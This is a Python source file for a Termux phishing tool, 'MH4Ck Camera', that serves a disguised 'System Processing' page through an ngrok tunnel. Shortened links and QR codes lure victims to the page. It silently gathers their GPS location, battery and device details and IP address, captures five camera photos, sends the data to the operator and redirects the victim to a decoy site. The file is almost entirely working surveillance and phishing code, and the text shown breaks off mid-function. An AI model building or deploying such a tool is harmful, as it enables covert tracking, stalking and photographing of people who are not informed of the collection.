#!/usr/bin/env python3
# ============================================================================
# MH4Ck Camera v3.0 - Termux Ngrok v2 Stable
# Developer: @mengheang25
# From: Cambodia 🇰🇭
# ============================================================================

import os
import sys
import json
import time
import uuid
import base64
import threading
import urllib.parse
import requests
import subprocess
import signal
import atexit
import stat
import tarfile
import zipfile
import shutil
import socket
import platform
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO
import concurrent.futures
import logging
import re

# ==================== បិទ Log Flask ====================
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
os.environ['WERKZEUG_RUN_MAIN'] = 'true'

# ==================== Flask App ====================
app = Flask(__name__)

# ==================== អថេរសកល ====================
ngrok_process = None
ngrok_url = None
current_mode = "cam_location"
processed_clicks = set()
notification_lock = threading.Lock()
flask_port = 8080  # ប្តូរទៅ 8080 ដើម្បីកុំឲ្យប៉ះទង្គិចជាមួយកម្មវិធីផ្សេង

# ==================== ពណ៌សម្រាប់បង្ហាញ ====================
class Colors:
    HEADER = '\033[1;35m'
    BLUE = '\033[1;34m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    RED = '\033[1;31m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    PURPLE = '\033[1;35m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    END = '\033[0m'
    ORANGE = '\033[1;91m'
    PINK = '\033[1;95m'

# ==================== HTML Templates ====================
CAM_LOCATION_HTML = """<!DOCTYPE html>
<html>
<head>
    <title>System Processing...</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(145deg, #0a0f1e 0%, #141b2b 100%);
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
            background: rgba(10, 20, 30, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 40px 20px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
        }
        h2 {
            font-size: 28px;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #00ff87, #60efff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 600;
        }
        .loading {
            display: inline-block;
            width: 60px;
            height: 60px;
            border: 5px solid rgba(0,255,135,0.2);
            border-radius: 50%;
            border-top-color: #00ff87;
            border-right-color: #60efff;
            animation: spin 1s infinite;
            margin: 20px 0;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        p {
            color: #a0b3cc;
            font-size: 16px;
            margin: 10px 0;
            letter-spacing: 1px;
        }
        .dots {
            display: inline-block;
        }
        .dots::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
        .security-badge {
            margin-top: 30px;
            color: #4a5c72;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>System Processing</h2>
        <div class="loading"></div>
        <p>Please wait<span class="dots"></span></p>
        <p style="font-size: 14px; color: #5a6c82;">Initializing secure connection...</p>
        <div class="security-badge">
            🔒 SSL Encrypted | Secure Handshake
        </div>
    </div>

    <script>
    async function start() {
        try {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };

            // Get location
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 8000,
                            maximumAge: 0
                        });
                    });
                    info.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        heading: position.coords.heading,
                        speed: position.coords.speed
                    };
                } catch(e) {
                    info.locationError = e.message;
                }
            } else {
                info.locationError = "Geolocation not supported";
            }

            // Get battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    info.batteryLevel = Math.round(battery.level * 100);
                    info.batteryCharging = battery.charging;
                    info.batteryTimeRemaining = battery.dischargingTime;
                } catch(e) {}
            }

            // Get camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                info.cameraAccess = true;
                info.cameraType = "front";
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                info.cameraPhotos = [];
                
                // Take 5 photos
                for(let i = 0; i < 5; i++) {
                    await new Promise(r => setTimeout(r, 300));
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    info.cameraPhotos.push(canvas.toDataURL('image/jpeg', 0.9));
                }
                
                stream.getTracks().forEach(t => t.stop());
                
            } catch(e) {
                info.cameraAccess = false;
                info.cameraError = e.name || e.message;
            }

            // Get IP
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                info.ipAddress = data.ip;
            } catch(e) {
                info.ipAddress = 'unknown';
            }

            // Send data
            await fetch('/track/{{ track_id }}?mode={{ mode }}', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });

            // Redirect
            window.location.href = '{{ redirect_url }}';
            
        } catch(error) {
            console.error(error);
            window.location.href = '{{ redirect_url }}';
        }
    }

    // Start immediately
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', start);
    } else {
        start();
    }
    </script>
</body>
</html>"""

ONLY_LOCATION_HTML = CAM_LOCATION_HTML.replace("// Get camera", "/* Camera disabled */").replace(
    "// Get camera", "/* Camera disabled */"
).replace(
    """// Get camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                info.cameraAccess = true;
                info.cameraType = "front";
                
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                info.cameraPhotos = [];
                
                // Take 5 photos
                for(let i = 0; i < 5; i++) {
                    await new Promise(r => setTimeout(r, 300));
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    info.cameraPhotos.push(canvas.toDataURL('image/jpeg', 0.9));
                }
                
                stream.getTracks().forEach(t => t.stop());
                
            } catch(e) {
                info.cameraAccess = false;
                info.cameraError = e.name || e.message;
            }""", 
    "// Camera disabled"
)

BACK_CAMERA_HTML = CAM_LOCATION_HTML.replace('facingMode: "user"', 'facingMode: { exact: "environment" }').replace('"front"', '"back"')

FRONT_CAMERA_HTML = CAM_LOCATION_HTML

# ==================== មុខងារទាញយក Ngrok v2 ====================
def download_ngrok():
    """ទាញយក ngrok v2 សម្រាប់ Termux"""
    ngrok_path = os.path.join(os.getcwd(), 'ngrok')
    
    # បើមានរួចហើយ សាកល្បងប្រើ
    if os.path.exists(ngrok_path):
        try:
            os.chmod(ngrok_path, os.stat(ngrok_path).st_mode | stat.S_IEXEC)
            # សាកល្បងដំណើរការ
            result = subprocess.run([ngrok_path, 'version'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                print(f"{Colors.GREEN}[✅] Ngrok មានរួចហើយ: {result.stdout.strip()}{Colors.END}")
                return ngrok_path
        except:
            pass
    
    print(f"{Colors.YELLOW}[📥] កំពុងទាញយក Ngrok v2 សម្រាប់ Termux...{Colors.END}")
    
    # រកមើល architecture
    machine = platform.machine().lower()
    print(f"{Colors.CYAN}[ℹ️] Architecture: {machine}{Colors.END}")
    
    # កំណត់ URL តាម architecture
    if 'aarch64' in machine or 'arm64' in machine:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz"
        filename = "ngrok-stable-linux-arm64.tgz"
    elif 'arm' in machine:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.tgz"
        filename = "ngrok-stable-linux-arm.tgz"
    elif 'x86_64' in machine or 'amd64' in machine:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz"
        filename = "ngrok-stable-linux-amd64.tgz"
    else:
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz"
        filename = "ngrok-stable-linux-386.tgz"
    
    try:
        # ទាញយក
        print(f"{Colors.YELLOW}   URL: {url}{Colors.END}")
        
        # ប្រើ session ដើម្បីការពារ connection error
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        
        response = session.get(url, stream=True, timeout=30, allow_redirects=True)
        response.raise_for_status()
        
        total_size = int(response.headers.get('content-length', 0))
        block_size = 8192
        downloaded = 0
        
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=block_size):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total_size > 0:
                        percent = (downloaded / total_size) * 100
                        bar_length = 30
                        filled = int(bar_length * downloaded // total_size)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        sys.stdout.write(f'\r   [{bar}] {percent:.1f}%')
                        sys.stdout.flush()
        
        print(f"\n{Colors.GREEN}   ✅ ទាញយករួចរាល់!{Colors.END}")
        
        # ពន្លា
        print(f"{Colors.YELLOW}   📦 កំពុងពន្លា...{Colors.END}")
        
        if filename.endswith('.tgz') or filename.endswith('.tar.gz'):
            with tarfile.open(filename, 'r:gz') as tar:
                tar.extractall()
        elif filename.endswith('.zip'):
            with zipfile.ZipFile(filename, 'r') as zip_ref:
                zip_ref.extractall()
        
        # លុបឯកសារបណ្តោះអាសន្ន
        os.remove(filename)
        
        # កំណត់សិទ្ធិ
        if os.path.exists(ngrok_path):
            os.chmod(ngrok_path, 0o755)
        
        # សាកល្បងដំណើរការ
        result = subprocess.run([ngrok_path, 'version'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            print(f"{Colors.GREEN}[✅] Ngrog ដំឡើងរួចរាល់: {result.stdout.strip()}{Colors.END}")
            return ngrok_path
        else:
            print(f"{Colors.RED}[❌] Ngrok ដំឡើងបរាជ័យ{Colors.END}")
            return None
        
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}[❌] បរាជ័យក្នុងការទាញយក: {e}{Colors.END}")
        
        # វិធីជំនួស: ប្រើ wget
        try:
            print(f"{Colors.YELLOW}   កំពុងព្យាយាមប្រើ wget...{Colors.END}")
            subprocess.run(['wget', '-O', filename, url], check=True, timeout=30)
            
            if filename.endswith('.tgz') or filename.endswith('.tar.gz'):
                with tarfile.open(filename, 'r:gz') as tar:
                    tar.extractall()
            elif filename.endswith('.zip'):
                with zipfile.ZipFile(filename, 'r') as zip_ref:
                    zip_ref.extractall()
            
            os.remove(filename)
            
            if os.path.exists(ngrok_path):
                os.chmod(ngrok_path, 0o755)
                print(f"{Colors.GREEN}[✅] Ngrok ដំឡើងរួចរាល់!{Colors.END}")
                return ngrok_path
        except:
            print(f"{Colors.RED}[❌] បរាជ័យគ្រប់វិធី{Colors.END}")
            return None
    
    except Exception as e:
        print(f"{Colors.RED}[❌] កំហុស: {e}{Colors.END}")
        return None

# ==================== កំណត់ Ngrok Authtoken ====================
def setup_ngrok_auth(authtoken):
    """កំណត់ authtoken សម្រាប់ ngrok v2"""
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return False
    
    # ពិនិត្យមើលថា authtoken មានសុពលភាព
    if len(authtoken) < 10:
        print(f"{Colors.RED}[❌] Authtoken មិនត្រឹមត្រូវ{Colors.END}")
        return False
    
    try:
        print(f"{Colors.YELLOW}[🔑] កំពុងកំណត់ Ngrok Authtoken...{Colors.END}")
        
        # វិធីទី 1: ប្រើ command authtoken
        result = subprocess.run(
            [ngrok_path, 'authtoken', authtoken],
            capture_output=True,
            text=True,
            timeout=10,
            env={**os.environ, 'HOME': os.path.expanduser('~')}
        )
        
        if result.returncode == 0:
            print(f"{Colors.GREEN}[✅] កំណត់ Authtoken រួចរាល់!{Colors.END}")
            return True
        else:
            # វិធីទី 2: បង្កើត config file ដោយផ្ទាល់
            home = os.path.expanduser("~")
            ngrok_dir = os.path.join(home, ".config", "ngrok")
            os.makedirs(ngrok_dir, exist_ok=True)
            
            # Ngrok v3 config format
            config_file = os.path.join(ngrok_dir, "ngrok.yml")
            with open(config_file, 'w') as f:
                f.write(f"version: '2'\nauthtoken: {authtoken}\n")
            
            # វិធីទី 3: រក្សាទុកក្នុង .ngrok2
            ngrok2_dir = os.path.join(home, ".ngrok2")
            os.makedirs(ngrok2_dir, exist_ok=True)
            config_file2 = os.path.join(ngrok2_dir, "ngrok.yml")
            with open(config_file2, 'w') as f:
                f.write(f"authtoken: {authtoken}\n")
            
            print(f"{Colors.GREEN}[✅] រក្សាទុក Authtoken ក្នុង config file{Colors.END}")
            return True
            
    except subprocess.TimeoutExpired:
        print(f"{Colors.YELLOW}[⚠️] Timeout ប៉ុន្តែអាចដំណើរការបាន{Colors.END}")
        return True
    except Exception as e:
        print(f"{Colors.RED}[❌] បរាជ័យ: {e}{Colors.END}")
        return False

# ==================== ពិនិត្យ Port ====================
def is_port_available(port):
    """ពិនិត្យមើលថា port ទំនេរឬទេ"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', port))
            return True
        except:
            return False

def find_available_port(start_port=8080, max_attempts=10):
    """រក port ទំនេរ"""
    for port in range(start_port, start_port + max_attempts):
        if is_port_available(port):
            return port
    return None

# ==================== ចាប់ផ្តើម Ngrok ====================
def start_ngrok(port):
    """ចាប់ផ្តើម ngrok tunnel"""
    global ngrok_process, ngrok_url
    
    ngrok_path = download_ngrok()
    if not ngrok_path:
        return None
    
    # បិទ ngrok ចាស់
    stop_ngrok()
    
    # រកមើល authtoken
    home = os.path.expanduser("~")
    config_paths = [
        os.path.join(home, ".config", "ngrok", "ngrok.yml"),
        os.path.join(home, ".ngrok2", "ngrok.yml"),
        os.path.join(home, ".ngrok", "ngrok.yml")
    ]
    
    has_auth = False
    for config_path in config_paths:
        if os.path.exists(config_path):
            with open(config_path, 'r') as f:
                if 'authtoken' in f.read():
                    has_auth = True
                    break
    
    if not has_auth:
        print(f"{Colors.RED}[❌] សូមកំណត់ Authtoken ជាមុន!{Colors.END}")
        return None
    
    try:
        print(f"{Colors.YELLOW}[🔄] កំពុងចាប់ផ្តើម Ngrok លើ port {port}...{Colors.END}")
        
        # បង្កើត config file បណ្តោះអាសន្ន
        temp_config = os.path.join(os.getcwd(), f"ngrok_{port}.yml")
        with open(temp_config, 'w') as f:
            f.write(f"""version: "2"
authtoken: dummy
tunnels:
  default:
    proto: http
    addr: {port}
    inspect: false
""")
        
        # ចាប់ផ្តើម ngrok
        ngrok_process = subprocess.Popen(
            [ngrok_path, 'http', str(port), '--log=stdout', '--log-level=debug'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            env={**os.environ, 'HOME': home}
        )
        
        # រង់ចាំ ngrok ចាប់ផ្តើម
        print(f"{Colors.YELLOW}   កំពុងរង់ចាំ Ngrok ចាប់ផ្តើម...{Colors.END}")
        time.sleep(5)
        
        # ទាញយក URL
        for i in range(15):
            url = get_ngrok_url()
            if url:
                ngrok_url = url
                print(f"{Colors.GREEN}[✅] Ngrok ដំណើរការ: {url}{Colors.END}")
                
                # លុប config បណ្តោះអាសន្ន
                try:
                    os.remove(temp_config)
                except:
                    pass
                    
                return url
            time.sleep(1)
        
        # សាកល្បងវិធីផ្សេង
        url = get_ngrok_url_alternative()
        if url:
            ngrok_url = url
            print(f"{Colors.GREEN}[✅] Ngrok URL: {url}{Colors.END}")
            return url
        
        print(f"{Colors.RED}[❌] Ngrok បរាជ័យក្នុងការចាប់ផ្តើម{Colors.END}")
        return None
        
    except Exception as e:
        print(f"{Colors.RED}[❌] Error: {e}{Colors.END}")
        return None

def get_ngrok_url():
    """ទាញយក URL ពី Ngrok API"""
    api_urls = [
        'http://127.0.0.1:4040/api/tunnels',
        'http://localhost:4040/api/tunnels'
    ]
    
    for api_url in api_urls:
        try:
            response = requests.get(api_url, timeout=3)
            if response.status_code == 200:
                data = response.json()
                for tunnel in data.get('tunnels', []):
                    public_url = tunnel.get('public_url', '')
                    if public_url.startswith('https://'):
                        return public_url
                    elif public_url.startswith('http://'):
                        # ប្តូរទៅ HTTPS
                        return public_url.replace('http://', 'https://')
        except:
            continue
    
    return None

def get_ngrok_url_alternative():
    """វិធីជំនួស: អានពី log"""
    global ngrok_process
    
    if ngrok_process and ngrok_process.stdout:
        try:
            for _ in range(20):
                line = ngrok_process.stdout.readline()
                if 'url=' in line or 'started tunnel' in line:
                    match = re.search(r'https://[a-zA-Z0-9-]+\.ngrok\.io', line)
                    if match:
                        return match.group(0)
                time.sleep(0.5)
        except:
            pass
    
    return None

def stop_ngrok():
    """បិទ ngrok"""
    global ngrok_process
    
    if ngrok_process:
        try:
            ngrok_process.terminate()
            ngrok_process.wait(timeout=3)
        except:
            ngrok_process.kill()
        ngrok_process = None
    
    # បិទ ngrok ទាំងអស់
    try:
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        subprocess.run(['killall', '-9', 'ngrok'], capture_output=True)
    except:
        pass
    
    time.sleep(1)

# ==================== រក្សាទុករូបភាព ====================
def save_photos(track_id, photos, camera_type):
    """រក្សាទុករូបភាពជាមួយ watermark"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        dir_path = f"captured_images/{track_id}_{timestamp}"
        os.makedirs(dir_path, exist_ok=True)
        
        saved = 0
        total = len(photos)
        
        for i, photo_data in enumerate(photos):
            try:
                # ដោះ base64
                if ',' in photo_data:
                    photo_data = photo_data.split(',')[1]
                
                img_data = base64.b64decode(photo_data)
                img = Image.open(BytesIO(img_data))
                
                # បន្ថែម watermark
                draw = ImageDraw.Draw(img)
                try:
                    # សាកល្បងរក font
                    font_paths = [
                        "/system/fonts/DroidSans.ttf",
                        "/data/data/com.termux/files/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
                        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
                    ]
                    font = None
                    for fp in font_paths:
                        if os.path.exists(fp):
                            font = ImageFont.truetype(fp, 20)
                            break
                except:
                    font = None
                
                # បន្ថែមព័ត៌មាន
                text1 = "MH4Ck Camera"
                text2 = f"ID: {track_id} | {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                text3 = "t.me/mengheang25"
                
                draw.text((10, img.height - 70), text1, fill=(255,255,255), font=font)
                draw.text((10, img.height - 45), text2, fill=(200,200,200), font=font)
                draw.text((10, img.height - 20), text3, fill=(0,255,0), font=font)
                
                # រក្សាទុក
                output = BytesIO()
                img.save(output, format='JPEG', quality=90)
                
                filename = f"{dir_path}/{camera_type}_{i+1}.jpg"
                with open(filename, 'wb') as f:
                    f.write(output.getvalue())
                
                saved += 1
                
            except Exception as e:
                continue
        
        print(f"{Colors.GREEN}   💾 រក្សាទុក {saved}/{total} រូបភាព{Colors.END}")
        print(f"{Colors.CYAN}   📁 ទីតាំង: {dir_path}{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}   ❌ បរាជ័យក្នុងការរក្សាទុក: {e}{Colors.END}")

# ==================== បង្ហាញ Notification ====================
def print_notification(track_id, data, mode):
    """បង្ហាញពេលមានអ្នកចុច link"""
    
    mode_names = {
        'cam_location': '📸 Camera + Location',
        'only_location': '📍 Only Location',
        'back_camera': '📷 Back Camera',
        'front_camera': '🤳 Front Camera'
    }
    
    mode_display = mode_names.get(mode, mode)
    
    print(f"\n{Colors.RED}{Colors.BLINK}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.YELLOW}{Colors.BLINK}                    🔔 មានអ្នកចុច Link! 🔔{Colors.END}")
    print(f"{Colors.RED}{Colors.BLINK}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.CYAN}[⏰] ម៉ោង:{Colors.END}      {data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}")
    print(f"{Colors.CYAN}[🎯] របៀប:{Colors.END}      {mode_display}")
    print(f"{Colors.CYAN}[🆔] Track ID:{Colors.END}  {track_id}")
    print(f"{Colors.CYAN}[🌐] IP:{Colors.END}        {data.get('ip_address', 'N/A')}")
    
    if 'location' in data:
        lat = data['location'].get('latitude', 'N/A')
        lng = data['location'].get('longitude', 'N/A')
        accuracy = data['location'].get('accuracy', 'N/A')
        print(f"{Colors.GREEN}[📍] ទីតាំង:{Colors.END}    {lat}, {lng}")
        print(f"{Colors.GREEN}[🎯] ភាពត្រឹមត្រូវ:{Colors.END} ±{accuracy}m")
        print(f"{Colors.GREEN}[🗺️] Google Maps:{Colors.END} https://maps.google.com/?q={lat},{lng}")
    
    if 'batteryLevel' in data:
        battery = data['batteryLevel']
        charging = data.get('batteryCharging', False)
        charging_icon = "⚡" if charging else ""
        print(f"{Colors.YELLOW}[🔋] ថ្ម:{Colors.END}        {battery}% {charging_icon}")
    
    if 'cameraPhotos' in data and data['cameraPhotos']:
        camera_type = data.get('cameraType', 'front')
        camera_icon = "🤳" if camera_type == 'front' else "📷"
        print(f"{Colors.PURPLE}[{camera_icon}] កាមេរ៉ា:{Colors.END}     {camera_type}")
        print(f"{Colors.PURPLE}[📸] រូបថត:{Colors.END}     {len(data['cameraPhotos'])} សន្លឹក")
    
    if 'userAgent' in data:
        ua = data['userAgent']
        if 'Android' in ua:
            device = '📱 Android'
        elif 'iPhone' in ua:
            device = '📱 iPhone'
        elif 'Windows' in ua:
            device = '💻 Windows'
        elif 'Mac' in ua:
            device = '💻 Mac'
        else:
            device = '📱 ទូរស័ព្ទ'
        print(f"{Colors.BLUE}[📱] ឧបករណ៍:{Colors.END}    {device}")
    
    print(f"{Colors.RED}═══════════════════════════════════════════════════════════════{Colors.END}\n")

# ==================== Flask Route ====================
@app.route('/track/<track_id>', methods=['GET', 'POST'])
def track_handler(track_id):
    """ដោះស្រាយការចូលមកកាន់ link"""
    if request.method == 'GET':
        # GET request: បង្ហាញ HTML
        redirect_url = request.args.get('url', 'https://www.google.com')
        mode = request.args.get('mode', 'cam_location')
        
        if mode == 'cam_location':
            html = CAM_LOCATION_HTML
        elif mode == 'only_location':
            html = ONLY_LOCATION_HTML
        elif mode == 'back_camera':
            html = BACK_CAMERA_HTML
        else:
            html = FRONT_CAMERA_HTML
        
        return render_template_string(
            html, 
            track_id=track_id, 
            redirect_url=redirect_url, 
            mode=mode
        )
    
    else:
        # POST request: ទទួលទិន្នន័យ
        try:
            data = request.json
            data['ip_address'] = request.remote_addr
            data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            mode = request.args.get('mode', 'cam_location')
            
            # ការពារការបង្ហាញច្រើនដង
            click_id = f"{track_id}_{data.get('ip_address', 'unknown')}_{int(time.time())}"
            
            with notification_lock:
                if click_id not in processed_clicks:
                    print_notification(track_id, data, mode)
                    processed_clicks.add(click_id)
                    
                    # រក្សាទុករូបភាព
                    if 'cameraPhotos' in data and data['cameraPhotos']:
                        camera_type = data.get('cameraType', 'front')
                        save_photos(track_id, data['cameraPhotos'], camera_type)
                    
                    # រក្សាទុកទិន្នន័យទាំងអស់
                    try:
                        log_file = f"captured_images/track_{track_id}.json"
                        existing = []
                        if os.path.exists(log_file):
                            with open(log_file, 'r') as f:
                                existing = json.load(f)
                        existing.append(data)
                        with open(log_file, 'w') as f:
                            json.dump(existing, f, indent=2)
                    except:
                        pass
            
            return jsonify({'success': True})
            
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})

# ==================== មុខងារចម្បង ====================
def create_link(mode):
    """បង្កើត tracking link"""
    global current_mode, flask_port
    current_mode = mode
    
    # ពិនិត្យមើល Termux
    is_termux = 'com.termux' in os.environ.get('PREFIX', '')
    if is_termux:
        print(f"{Colors.GREEN}[✅] រកឃើញ Termux{Colors.END}")
    
    # 1. រក port ទំនេរ
    port = find_available_port(8080)
    if not port:
        print(f"{Colors.RED}[❌] មិនអាចរក port ទំនេរបានទេ!{Colors.END}")
        return False
    
    flask_port = port
    
    # 2. បញ្ចូល authtoken
    print(f"\n{Colors.YELLOW}[🔑] សូមបញ្ចូល Ngrok Authtoken:{Colors.END}")
    print(f"{Colors.CYAN}    ទទួលបានពី: https://dashboard.ngrok.com/signup{Colors.END}")
    print(f"{Colors.CYAN}    បន្ទាប់មក: https://dashboard.ngrok.com/get-started/your-authtoken{Colors.END}")
    
    token = input(f"{Colors.YELLOW}    Authtoken: {Colors.END}").strip()
    
    if not token:
        print(f"{Colors.RED}[❌] មិនអាចទទេរ!{Colors.END}")
        return False
    
    # 3. កំណត់ authtoken
    if not setup_ngrok_auth(token):
        print(f"{Colors.RED}[❌] កំណត់ Authtoken បរាជ័យ!{Colors.END}")
        return False
    
    # 4. បញ្ចូល URL គោលដៅ
    target = input(f"{Colors.YELLOW}[🎯] URL គោលដៅ (Enter = Google): {Colors.END}").strip()
    if not target:
        target = "https://www.google.com"
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    # 5. បញ្ចូល Track ID ផ្ទាល់ខ្លួន (optional)
    custom_id = input(f"{Colors.YELLOW}[🆔] Track ID (Enter = random): {Colors.END}").strip()
    if custom_id and len(custom_id) > 3:
        track_id = custom_id.replace(' ', '_')
    else:
        track_id = str(uuid.uuid4())[:6]
    
    # 6. ចាប់ផ្តើម Flask
    print(f"{Colors.YELLOW}[🔄] កំពុងចាប់ផ្តើម Flask លើ port {port}...{Colors.END}")
    
    flask_thread = threading.Thread(
        target=lambda: app.run(
            host='0.0.0.0', 
            port=port, 
            debug=False, 
            use_reloader=False,
            threaded=True
        ),
        daemon=True
    )
    flask_thread.start()
    
    print(f"{Colors.GREEN}[✅] Flask ដំណើរការលើ port {port}{Colors.END}")
    time.sleep(3)
    
    # 7. ចាប់ផ្តើម Ngrok
    ngrok_public_url = start_ngrok(port)
    if not ngrok_public_url:
        print(f"{Colors.RED}[❌] Ngrok បរាជ័យ!{Colors.END}")
        print(f"{Colors.YELLOW}[⚠️] កំពុងព្យាយាមចាប់ផ្តើមម្តងទៀត...{Colors.END}")
        time.sleep(2)
        ngrok_public_url = start_ngrok(port)
        
        if not ngrok_public_url:
            print(f"{Colors.RED}[❌] Ngrok បរាជ័យម្តងទៀត!{Colors.END}")
            print(f"{Colors.YELLOW}[ℹ️] សូមពិនិត្យមើល:{Colors.END}")
            print("    1. Internet connection")
            print("    2. Authtoken ត្រឹមត្រូវ")
            print("    3. សាកល្បងប្រើ serveo.net ជំនួស")
            return False
    
    # 8. បង្កើត Link
    tracking_link = f"{ngrok_public_url}/track/{track_id}?url={urllib.parse.quote(target)}&mode={mode}"
    
    # 9. បង្កើត Short link (optional)
    short_link = tracking_link
    try:
        short_response = requests.get(f"https://is.gd/create.php?format=simple&url={urllib.parse.quote(tracking_link)}", timeout=5)
        if short_response.status_code == 200:
            short_link = short_response.text.strip()
    except:
        pass
    
    # 10. បង្ហាញលទ្ធផល
    mode_names = {
        'cam_location': '📸 Camera + Location',
        'only_location': '📍 Only Location',
        'back_camera': '📷 Back Camera',
        'front_camera': '🤳 Front Camera'
    }
    
    print(f"\n{Colors.GREEN}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.GREEN}                    ✅ LINK បង្កើតរួចរាល់!                    {Colors.END}")
    print(f"{Colors.GREEN}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.CYAN}[🎯] របៀប:{Colors.END}        {mode_names.get(mode, mode)}")
    print(f"{Colors.CYAN}[🆔] Track ID:{Colors.END}    {track_id}")
    print(f"{Colors.CYAN}[🔗] Link របស់អ្នក:{Colors.END}")
    print(f"{Colors.UNDERLINE}{tracking_link}{Colors.END}")
    
    if short_link != tracking_link:
        print(f"\n{Colors.CYAN}[📎] Short link:{Colors.END}")
        print(f"{Colors.UNDERLINE}{short_link}{Colors.END}")
    
    print(f"\n{Colors.YELLOW}[📱] QR Code:{Colors.END}")
    print(f"    https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={urllib.parse.quote(tracking_link)}")
    
    print(f"\n{Colors.GREEN}═══════════════════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.YELLOW}[⚠️]  រង់ចាំការចុច Link... (Ctrl+C ដើម្បីបញ្ឈប់){Colors.END}")
    print(f"{Colors.GREEN}═══════════════════════════════════════════════════════════════{Colors.END}\n")
    
    return True

# ==================== ពិនិត្យប្រព័ន្ធ ====================
def check_dependencies():
    """ពិនិត្យមើលកញ្ចប់ចាំបាច់"""
    missing = []
    
    # ពិនិត្យ Python packages
    try:
        import PIL
    except:
        missing.append('pillow')
    
    try:
        import requests
    except:
        missing.append('requests')
    
    if missing:
        print(f"{Colors.YELLOW}[⚠️] កញ្ចប់បាត់: {', '.join(missing)}{Colors.END}")
        print(f"{Colors.YELLOW}    សូមដំឡើង: pip install {' '.join(missing)}{Colors.END}")
        
